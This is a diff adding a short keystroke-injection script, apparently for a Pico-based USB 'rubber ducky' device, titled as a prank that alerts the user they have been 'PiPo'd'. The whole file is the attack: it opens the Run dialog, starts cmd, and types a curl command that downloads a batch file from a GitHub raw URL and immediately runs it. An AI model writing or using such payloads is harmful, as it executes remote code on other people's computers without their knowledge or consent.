@@ -1,0 +1,11 @@
+#T> PiPo Alert
+#D> Alerts the user they have been PiPo'd
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+STRING curl -o alert.bat https://raw.githubusercontent.com/StuffzEZ/PiPo-Duck/refs/heads/scripts/batch/picods-alert.bat && alert.bat
+ENTER
